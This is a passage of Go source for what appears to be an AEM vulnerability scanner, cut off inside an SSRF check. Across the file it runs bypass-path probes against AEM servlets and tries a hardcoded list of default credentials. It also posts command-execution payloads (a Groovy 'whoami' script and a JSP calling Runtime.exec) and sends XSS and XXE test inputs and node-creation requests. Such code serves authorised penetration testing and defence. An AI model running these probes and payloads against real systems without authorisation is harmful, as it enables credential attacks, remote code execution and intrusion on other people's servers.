package aem

import (
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"sync"
)

// ScannerCheck is a function that checks for a specific vulnerability
type ScannerCheck func(baseURL string, ssrfHost string, client *HTTPClient) []Finding

var (
	scannerChecks = make(map[string]ScannerCheck)
	scannerMutex sync.Mutex
)

// RegisterScannerCheck registers a vulnerability check
func RegisterScannerCheck(name string, check ScannerCheck) {
	scannerMutex.Lock()
	defer scannerMutex.Unlock()
	scannerChecks[name] = check
}

// GetScannerCheck returns a registered check by name
func GetScannerCheck(name string) (ScannerCheck, bool) {
	scannerMutex.Lock()
	defer scannerMutex.Unlock()
	check, exists := scannerChecks[name]
	return check, exists
}

// ListScannerChecks returns all registered check names
func ListScannerChecks() []string {
	scannerMutex.Lock()
	defer scannerMutex.Unlock()
	names := make([]string, 0, len(scannerChecks))
	for name := range scannerChecks {
		names = append(names, name)
	}
	return names
}

// ScanAEMInstance scans an AEM instance for vulnerabilities
func ScanAEMInstance(baseURL string, ssrfHost string, client *HTTPClient, checkNames []string) []Finding {
	var findings []Finding
	var mu sync.Mutex
	var wg sync.WaitGroup

	scannerMutex.Lock()
	checksToRun := make([]ScannerCheck, 0)
	if len(checkNames) == 0 {
		// Run all checks
		for _, check := range scannerChecks {
			checksToRun = append(checksToRun, check)
		}
	} else {
		// Run only specified checks
		for _, name := range checkNames {
			if check, exists := scannerChecks[name]; exists {
				checksToRun = append(checksToRun, check)
			}
		}
	}
	scannerMutex.Unlock()

	for _, check := range checksToRun {
		wg.Add(1)
		go func(c ScannerCheck) {
			defer wg.Done()
			results := c(baseURL, ssrfHost, client)
			if len(results) > 0 {
				mu.Lock()
				findings = append(findings, results...)
				mu.Unlock()
			}
		}(check)
	}

	wg.Wait()
	return findings
}

// Initialize all scanner checks
func init() {
	RegisterScannerCheck("get_servlet", checkGetServlet)
	RegisterScannerCheck("querybuilder_servlet", checkQueryBuilderServlet)
	RegisterScannerCheck("gql_servlet", checkGQLServlet)
	RegisterScannerCheck("post_servlet", checkPostServlet)
	RegisterScannerCheck("create_new_nodes", checkCreateNewNodes)
	RegisterScannerCheck("loginstatus_servlet", checkLoginStatusServlet)
	RegisterScannerCheck("userinfo_servlet", checkUserInfoServlet)
	RegisterScannerCheck("felix_console", checkFelixConsole)
	RegisterScannerCheck("wcmdebug_filter", checkWCMDebugFilter)
	RegisterScannerCheck("wcmsuggestions_servlet", checkWCMSuggestionsServlet)
	RegisterScannerCheck("crxde_crx", checkCRXDECRX)
	RegisterScannerCheck("groovy_console", checkGroovyConsole)
	RegisterScannerCheck("acs_tools", checkACSTools)
	RegisterScannerCheck("webdav", checkWebDAV)
	RegisterScannerCheck("set_preferences", checkSetPreferences)
	RegisterScannerCheck("merge_metadata", checkMergeMetadata)
	RegisterScannerCheck("guide_internal_submit_servlet", checkGuideInternalSubmitServlet)
	// SSRF checks require SSRF host
	RegisterScannerCheck("salesforcesecret_servlet", checkSalesforceSecretServlet)
	RegisterScannerCheck("reportingservices_servlet", checkReportingServicesServlet)
	RegisterScannerCheck("sitecatalyst_servlet", checkSiteCatalystServlet)
	RegisterScannerCheck("autoprovisioning_servlet", checkAutoProvisioningServlet)
	RegisterScannerCheck("opensocial_proxy", checkOpenSocialProxy)
	RegisterScannerCheck("opensocial_makeRequest", checkOpenSocialMakeRequest)
	RegisterScannerCheck("swf_xss", checkSWFXSS)
	RegisterScannerCheck("externaljob_servlet", checkExternalJobServlet)
}

// Default credentials to test
var defaultCreds = []string{
	"admin:admin",
	"author:author",
	"grios:password",
	"replication-receiver:replication-receiver",
	"vgnadmin:vgnadmin",
	"aparker@geometrixx.info:aparker",
	"jdoe@geometrixx.info:jdoe",
	"james.devore@spambob.com:password",
	"matt.monroe@mailinator.com:password",
	"aaron.mcdonald@mailinator.com:password",
	"jason.werner@dodgit.com:password",
}

// checkGetServlet checks for exposed DefaultGetServlet
func checkGetServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{"/", "/etc", "/var", "/apps", "/home", "///etc", "///var", "///apps", "///home"}
	suffixes := []string{
		"", ".children",
	}
	extensions := []string{
		".json", ".1.json", "....4.2.1....json", ".json?" + r + ".css", ".json?" + r + ".ico", ".json?" + r + ".html",
		".json/" + r + ".css", ".json/" + r + ".html", ".json/" + r + ".png", ".json/" + r + ".ico",
		".json;%0a" + r + ".css", ".json;%0a" + r + ".png", ".json;%0a" + r + ".html", ".json;%0a" + r + ".ico",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			for _, ext := range extensions {
				url := NormalizeURL(baseURL, path+suffix+ext)
				resp, err := client.Get(url, nil)
				if err != nil {
					continue
				}

				if resp.StatusCode == 200 {
					body, _ := io.ReadAll(resp.Body)
					resp.Body.Close()

					var jsonData interface{}
					if err := json.Unmarshal(body, &jsonData); err == nil {
						if m, ok := jsonData.(map[string]interface{}); ok {
							if _, exists := m["jcr:primaryType"]; exists {
								findings = append(findings, Finding{
									Name:        "DefaultGetServlet",
									URL:         url,
									Description: "Sensitive information might be exposed via AEM's DefaultGetServlet. Check child nodes manually for secrets exposed.",
								})
								return findings
							}
						}
					}
				}
			}
		}
	}
	return findings
}

// checkQueryBuilderServlet checks for exposed QueryBuilder servlets
func checkQueryBuilderServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/bin/querybuilder.json",
		"///bin///querybuilder.json",
		"/bin/querybuilder.feed",
		"///bin///querybuilder.feed",
	}
	suffixes := []string{
		"", ".css", ".ico", ".png", ".gif", ".html", ".1.json", "....4.2.1....json",
		";%0a" + r + ".css", ";%0a" + r + ".png", ";%0a" + r + ".html", ";%0a" + r + ".ico",
		".ico;%0a" + r + ".ico", ".css;%0a" + r + ".css", ".html;%0a" + r + ".html",
		"?" + r + ".css", "?" + r + ".ico",
	}

	foundJSON := false
	foundFeed := false

	for _, path := range paths {
		if foundJSON && foundFeed {
			break
		}

		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				var jsonData interface{}
				if err := json.Unmarshal(body, &jsonData); err == nil {
					if m, ok := jsonData.(map[string]interface{}); ok {
						if _, exists := m["hits"]; exists {
							if !foundJSON && strings.Contains(path, ".json") {
								findings = append(findings, Finding{
									Name:        "QueryBuilderJsonServlet",
									URL:         url,
									Description: "Sensitive information might be exposed via AEM's QueryBuilderJsonServlet.",
								})
								foundJSON = true
							}
						}
					}
				}

				if strings.Contains(string(body), "</feed>") {
					if !foundFeed && strings.Contains(path, ".feed") {
						findings = append(findings, Finding{
							Name:        "QueryBuilderFeedServlet",
							URL:         url,
							Description: "Sensitive information might be exposed via AEM's QueryBuilderFeedServlet.",
						})
						foundFeed = true
					}
				}
			}
		}
	}

	return findings
}

// checkGQLServlet checks for exposed GQL servlet
func checkGQLServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/bin/wcm/search/gql",
		"///bin///wcm///search///gql",
	}
	suffixes := []string{
		".json", "....1....json", ".json/" + r + ".css", ".json/" + r + ".html", ".json/" + r + ".ico", ".json/" + r + ".png",
		".json;%0a" + r + ".css", ".json;%0a" + r + ".ico", ".json;%0a" + r + ".html", ".json;%0a" + r + ".png",
	}
	query := "?query=type:User%20limit:..1&pathPrefix=&p.ico"

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix+query)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				var jsonData interface{}
				if err := json.Unmarshal(body, &jsonData); err == nil {
					if m, ok := jsonData.(map[string]interface{}); ok {
						if _, exists := m["hits"]; exists {
							findings = append(findings, Finding{
								Name:        "GQLServlet",
								URL:         url,
								Description: "Sensitive information might be exposed via AEM's GQLServlet.",
							})
							return findings
						}
					}
				}
			}
		}
	}
	return findings
}

// checkPostServlet checks for exposed POST servlet
func checkPostServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{"/", "/content", "/content/dam"}
	suffixes := []string{
		".json", ".1.json", "...4.2.1...json", ".json/" + r + ".css", ".json/" + r + ".html",
		".json;%0a" + r + ".css", ".json;%0a" + r + ".html",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				"Referer":      baseURL,
			}
			data := map[string]string{":operation": "nop"}
			resp, err := client.PostForm(url, data, headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "Null Operation Status:") {
					findings = append(findings, Finding{
						Name:        "POSTServlet",
						URL:         url,
						Description: "POSTServlet is exposed, persistent XSS or RCE might be possible, it depends on your privileges.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkCreateNewNodes checks if it's possible to create new JCR nodes
func checkCreateNewNodes(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding

	nodename1 := RandomString(10)
	r1 := RandomString(3)
	paths1 := []string{
		"/content/usergenerated/etc/commerce/smartlists/",
		"/content/usergenerated/",
	}
	suffixes1 := []string{
		"*", nodename1 + ".json", nodename1 + ".1.json", nodename1 + ".json/" + r1 + ".css",
		nodename1 + ".json/" + r1 + ".html", nodename1 + ".json/" + r1 + ".ico", nodename1 + ".json/" + r1 + ".png",
	}

	for _, path := range paths1 {
		for _, suffix := range suffixes1 {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				"Referer":      baseURL,
			}
			resp, err := client.Post(url, nil, headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "<td>Parent Location</td>") {
					findings = append(findings, Finding{
						Name:        "CreateJCRNodes",
						URL:         url,
						Description: "It's possible to create new JCR nodes using POST Servlet as anonymous user. You might get persistent XSS or perform other attack by accessing servlets registered by Resource Type.",
					})
					return findings
				}
			}
		}
	}

	// Try with default credentials
	nodename2 := RandomString(10)
	r2 := RandomString(3)
	paths2 := []string{"/", "/content/", "/apps/", "/libs/"}
	suffixes2 := []string{
		"*", nodename2 + ".json", nodename2 + ".1.json", nodename2 + ".json/" + r2 + ".css",
		nodename2 + ".json/" + r2 + ".html", nodename2 + ".json/" + r2 + ".ico", nodename2 + ".json/" + r2 + ".png",
	}

	for _, cred := range defaultCreds[:2] { // admin:admin, author:author
		for _, path := range paths2 {
			for _, suffix := range suffixes2 {
				url := NormalizeURL(baseURL, path+suffix)
				headers := map[string]string{
					"Content-Type":  "application/x-www-form-urlencoded",
					"Referer":       baseURL,
					"Authorization": BasicAuth(strings.Split(cred, ":")[0], strings.Split(cred, ":")[1]),
				}
				data := map[string]string{"a": "b"}
				resp, err := client.PostForm(url, data, headers)
				if err != nil {
					continue
				}

				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					body, _ := io.ReadAll(resp.Body)
					resp.Body.Close()

					if strings.Contains(string(body), "<td>Parent Location</td>") {
						findings = append(findings, Finding{
							Name:        "CreateJCRNodes",
							URL:         url,
							Description: fmt.Sprintf("It's possible to create new JCR nodes using POST Servlet as \"%s\" user. You might get persistent XSS or RCE.", cred),
						})
						return findings
					}
				}
			}
		}
	}

	return findings
}

// checkLoginStatusServlet checks for exposed LoginStatusServlet and default credentials
func checkLoginStatusServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/system/sling/loginstatus",
		"///system///sling///loginstatus",
	}
	suffixes := []string{
		".json", ".css", ".ico", ".png", ".gif", ".html", ".js", ".json/" + r + ".1.json",
		".json;%0a" + r + ".css", ".json;%0a" + r + ".html", ".json;%0a" + r + ".png",
		".json;%0a" + r + ".ico", "...4.2.1...json",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "authenticated=") {
					findings = append(findings, Finding{
						Name:        "LoginStatusServlet",
						URL:         url,
						Description: "LoginStatusServlet is exposed, it allows to bruteforce credentials. You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy, cq:LastModifiedBy attributes of any JCR node.",
					})

					// Test default credentials
					for _, cred := range defaultCreds {
						parts := strings.Split(cred, ":")
						headers := map[string]string{
							"Authorization": BasicAuth(parts[0], parts[1]),
						}
						resp2, err := client.Get(url, headers)
						if err != nil {
							continue
						}

						if resp2.StatusCode == 200 {
							body2, _ := io.ReadAll(resp2.Body)
							resp2.Body.Close()

							if strings.Contains(string(body2), "authenticated=true") {
								findings = append(findings, Finding{
									Name:        "AEM with default credentials",
									URL:         url,
									Description: fmt.Sprintf("AEM with default credentials \"%s\".", cred),
								})
							}
						}
					}

					return findings
				}
			}
		}
	}
	return findings
}

// checkUserInfoServlet checks for exposed UserInfoServlet
func checkUserInfoServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/libs/cq/security/userinfo",
		"///libs///cq///security///userinfo",
	}
	suffixes := []string{
		".json", ".css", ".ico", ".png", ".gif", ".html", ".js",
		".json?" + r + ".css", ".json/" + r + ".1.json",
		".json;%0a" + r + ".css", ".json;%0a" + r + ".html",
		".json;%0a" + r + ".ico", "...4.2.1...json",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "userID") {
					findings = append(findings, Finding{
						Name:        "UserInfoServlet",
						URL:         url,
						Description: "UserInfoServlet is exposed, it allows to bruteforce credentials.",
					})

					// Test default credentials
					for _, cred := range defaultCreds {
						parts := strings.Split(cred, ":")
						headers := map[string]string{
							"Authorization": BasicAuth(parts[0], parts[1]),
						}
						resp2, err := client.Get(url, headers)
						if err != nil {
							continue
						}

						if resp2.StatusCode == 200 {
							body2, _ := io.ReadAll(resp2.Body)
							resp2.Body.Close()

							if !strings.Contains(string(body2), "anonymous") {
								findings = append(findings, Finding{
									Name:        "AEM with default credentials",
									URL:         url,
									Description: fmt.Sprintf("AEM with default credentials \"%s\".", cred),
								})
							}
						}
					}

					return findings
				}
			}
		}
	}
	return findings
}

// checkFelixConsole checks for exposed Felix Console
func checkFelixConsole(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/system/console/bundles",
		"///system///console///bundles",
	}
	suffixes := []string{
		"", ".json", ".1.json", ".4.2.1...json", ".css", ".ico", ".png", ".gif", ".html", ".js",
		";%0a" + r + ".css", ";%0a" + r + ".html", ";%0a" + r + ".png", ".json;%0a" + r + ".ico",
		".servlet/" + r + ".css", ".servlet/" + r + ".js", ".servlet/" + r + ".html", ".servlet/" + r + ".ico",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Authorization": BasicAuth("admin", "admin"),
			}
			resp, err := client.Get(url, headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "Web Console - Bundles") {
					findings = append(findings, Finding{
						Name:        "FelixConsole",
						URL:         url,
						Description: "Felix Console is exposed, you may get RCE by installing OSGI bundle.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkWCMDebugFilter checks for exposed WCMDebugFilter
func checkWCMDebugFilter(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{"/", "/content", "/content/dam"}
	suffixes := []string{
		".json", ".1.json", "...4.2.1...json", ".json/" + r + ".css",
		".json/" + r + ".html", ".json/" + r + ".ico", ".json;%0a" + r + ".css",
		".json;%0a" + r + ".html", ".json;%0a" + r + ".ico",
	}
	query := "?debug=layout"

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix+query)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "res=") && strings.Contains(string(body), "sel=") {
					findings = append(findings, Finding{
						Name:        "WCMDebugFilter",
						URL:         url,
						Description: "WCMDebugFilter exposed and might be vulnerable to reflected XSS (CVE-2016-7882).",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkWCMSuggestionsServlet checks for exposed WCMSuggestionsServlet
func checkWCMSuggestionsServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/bin/wcm/contentfinder/connector/suggestions",
		"///bin///wcm///contentfinder///connector///suggestions",
	}
	suffixes := []string{
		".json", ".css", ".html", ".ico", ".png", ".gif", ".json/" + r + ".1.json",
		".json;%0a" + r + ".css", ".json/" + r + ".css", ".json/" + r + ".ico",
		".json/" + r + ".html", "...4.2.1...json",
	}
	query := "?query_term=path%3a/&pre=<1337abcdef>&post=yyyy"

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix+query)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "<1337abcdef>") {
					findings = append(findings, Finding{
						Name:        "WCMSuggestionsServlet",
						URL:         url,
						Description: "WCMSuggestionsServlet exposed and might result in reflected XSS.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkCRXDECRX checks for exposed CRXDE/CRX
func checkCRXDECRX(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/crx/de/index.jsp",
		"///crx///de///index.jsp",
		"/crx/explorer/browser/index.jsp",
		"///crx///explorer///browser///index.jsp",
		"/crx/explorer/ui/search.jsp",
		"/crx///explorer///ui///search.jsp",
		"/crx/explorer/ui/namespace_editor.jsp",
		"///crx/explorer///ui///namespace_editor.jsp",
		"/crx/packmgr/index.jsp",
		"///crx///packmgr///index.jsp",
	}
	suffixes := []string{
		"", ";%0a" + r + ".css", ";%0a" + r + ".html", ";%0a" + r + ".ico",
		"?" + r + ".css", "?" + r + ".html", "?" + r + ".ico",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				bodyStr := string(body)
				if strings.Contains(bodyStr, "CRXDE Lite") || strings.Contains(bodyStr, "Content Explorer") ||
					strings.Contains(bodyStr, "CRX Package Manager") || strings.Contains(bodyStr, "Search for:") ||
					strings.Contains(bodyStr, "Namespace URI") {
					findings = append(findings, Finding{
						Name:        "CRXDE Lite/CRX",
						URL:         url,
						Description: "Sensitive information might be exposed. Check manually.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkGroovyConsole checks for exposed Groovy Console
func checkGroovyConsole(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	script := "def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22"

	paths := []string{
		"/bin/groovyconsole/post.servlet",
		"///bin///groovyconsole///post.servlet",
		"/etc/groovyconsole/jcr:content.html",
		"///etc///groovyconsole///jcr:content.html",
	}
	suffixes := []string{
		"", ".css", ".html", ".ico", ".json", ".1.json", "...4.2.1...json",
		";%0a" + r + ".css", ";%0a" + r + ".html", ";%0a" + r + ".ico",
		"/" + r + ".css", "/" + r + ".html", "/" + r + ".ico", "/" + r + ".1.json",
		"/" + r + "...4.2.1...json",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				"Referer":      baseURL,
			}
			data := map[string]string{"script": script}
			resp, err := client.PostForm(url, data, headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "executionResult") {
					findings = append(findings, Finding{
						Name:        "GroovyConsole",
						URL:         url,
						Description: "Groovy console is exposed, RCE is possible.",
					})
					return findings
				}

				var jsonData map[string]interface{}
				if err := json.Unmarshal(body, &jsonData); err == nil {
					if _, exists := jsonData["output"]; exists {
						findings = append(findings, Finding{
							Name:        "GroovyConsole",
							URL:         url,
							Description: "Groovy console is exposed, RCE is possible.",
						})
						return findings
					}
				}
			}
		}
	}

	// Check audit endpoint
	auditPaths := []string{
		"/bin/groovyconsole/audit.servlet",
		"///bin///groovyconsole///audit.servlet",
	}
	auditSuffixes := []string{
		"", ".css", ".js", ".html", ".ico", ".png", ".json", ".1.json", "...4.2.1...json",
		";%0a" + r + ".css", ";%0a" + r + ".html", ";%0a" + r + ".ico",
	}

	for _, path := range auditPaths {
		for _, suffix := range auditSuffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				var jsonData map[string]interface{}
				if err := json.Unmarshal(body, &jsonData); err == nil {
					if _, exists := jsonData["data"]; exists {
						findings = append(findings, Finding{
							Name:        "GroovyConsole",
							URL:         url,
							Description: "Groovy console is exposed.",
						})
						return findings
					}
				}
			}
		}
	}

	return findings
}

// checkACSTools checks for exposed ACS AEM Tools
func checkACSTools(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	data := "scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09Process+proc+%3D+Runtime.getRuntime().exec(%22echo+abcdef31337%22)%3B%0A%09%0A%09BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource="

	paths := []string{
		"/etc/acs-tools/aem-fiddle/_jcr_content.run.html",
		"/etc/acs-tools/aem-fiddle/_jcr_content.run...4.2.1...html",
	}
	suffixes := []string{
		"", "/" + r + ".css", "/" + r + ".ico", "/a.png", "/" + r + ".json",
		"/" + r + ".1.json", "?" + r + ".css", "?" + r + ".ico",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Content-Type":  "application/x-www-form-urlencoded",
				"Referer":       baseURL,
				"Authorization": BasicAuth("admin", "admin"),
			}
			resp, err := client.Post(url, strings.NewReader(data), headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "abcdef31337") {
					findings = append(findings, Finding{
						Name:        "ACSTools",
						URL:         url,
						Description: "ACS Tools Fiddle is exposed, RCE is possible.",
					})
					return findings
				}
			}
		}
	}

	// Check predicates endpoint
	predicatesURL := NormalizeURL(baseURL, "/bin/acs-tools/qe/predicates.json")
	resp, err := client.Get(predicatesURL, nil)
	if err == nil && resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), "relativedaterange") {
			findings = append(findings, Finding{
				Name:        "ACSTools",
				URL:         predicatesURL,
				Description: "ACS Tools predicates.",
			})
		}
	}

	return findings
}

// checkWebDAV checks for exposed WebDAV
func checkWebDAV(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{"/crx/repository/test"}
	suffixes := []string{
		"", ".json", ".css", ".html", ".ico",
		";%0a" + r + ".css", ";%0a" + r + ".html", ";%0a" + r + ".ico",
		"/" + r + ".css", "/" + r + ".html", "/" + r + ".ico",
	}

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 401 {
				wwwAuth := strings.ToLower(resp.Header.Get("WWW-Authenticate"))
				if strings.Contains(wwwAuth, "webdav") {
					findings = append(findings, Finding{
						Name:        "WebDAV exposed",
						URL:         url,
						Description: "WebDAV might be vulnerable to CVE-2015-1833. Check it manually.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkSetPreferences checks for exposed SetPreferences page
func checkSetPreferences(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/crx/de/setPreferences.jsp",
		"///crx///de///setPreferences.jsp",
	}
	suffixes := []string{
		";%0a" + r + ".html",
		"/" + r + ".html",
	}
	query := "?keymap=<1337>&language=0"

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix+query)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 400 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "<1337>") {
					findings = append(findings, Finding{
						Name:        "SetPreferences",
						URL:         url,
						Description: "Page setPreferences.jsp is exposed, XSS might be possible via keymap parameter.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// checkMergeMetadata checks for exposed MergeMetadataServlet
func checkMergeMetadata(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/libs/dam/merge/metadata",
		"///libs///dam///merge///metadata",
	}
	suffixes := []string{
		".html", ".css/" + r + ".html", ".ico/" + r + ".html", "....4.2.1....json/" + r + ".html",
		".css;%0a" + r + ".html", ".ico;%0a" + r + ".html",
	}
	query := "?path=/etc&.ico"

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix+query)
			resp, err := client.Get(url, nil)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				var jsonData map[string]interface{}
				if err := json.Unmarshal(body, &jsonData); err == nil {
					if _, exists := jsonData["assetPaths"]; exists {
						findings = append(findings, Finding{
							Name:        "MergeMetadataServlet",
							URL:         url,
							Description: "MergeMetadataServlet is exposed, XSS might be possible via path parameter.",
						})
						return findings
					}
				}
			}
		}
	}
	return findings
}

// checkGuideInternalSubmitServlet checks for exposed GuideInternalSubmitServlet (XXE)
func checkGuideInternalSubmitServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	paths := []string{
		"/content/forms/af/geometrixx-gov/application-for-assistance/jcr:content/guideContainer",
		"/libs/fd/af/components/guideContainer/cq:template",
		"///libs///fd///af///components///guideContainer///cq:template",
		"/libs/fd/af/templates/simpleEnrollmentTemplate2/jcr:content/guideContainer",
		"///libs///fd///af///templates///simpleEnrollmentTemplate2///jcr:content///guideContainer",
	}
	suffixes := []string{
		".af.internalsubmit.json", ".af.internalsubmit.1.json", ".af.internalsubmit...1...json",
		".af.internalsubmit.html", ".af.internalsubmit.js", ".af.internalsubmit.css",
		".af.internalsubmit.ico", ".af.internalsubmit.png", ".af.internalsubmit.gif",
		".af.internalsubmit.svg", ".af.internalsubmit.ico;%0a" + r + ".ico",
		".af.internalsubmit.html;%0a" + r + ".html", ".af.internalsubmit.css;%0a" + r + ".css",
	}

	data := `guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<afData>\u0041\u0042\u0043</afData>"}}}`

	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				"Referer":      baseURL,
			}
			resp, err := client.Post(url, strings.NewReader(data), headers)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "<afData>ABC") {
					findings = append(findings, Finding{
						Name:        "GuideInternalSubmitServlet",
						URL:         url,
						Description: "GuideInternalSubmitServlet is exposed, XXE is possible.",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// SSRF checks - these require an SSRF detector server
// For now, we'll implement simplified versions that don't require the server
// Full implementation would require a separate SSRF detector HTTP server

// checkSalesforceSecretServlet checks for SSRF via SalesforceSecretServlet
func checkSalesforceSecretServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	// SSRF checks require a callback server
	// This is a placeholder - full implementation needs SSRF detector
	if ssrfHost == "" {
		return nil
	}
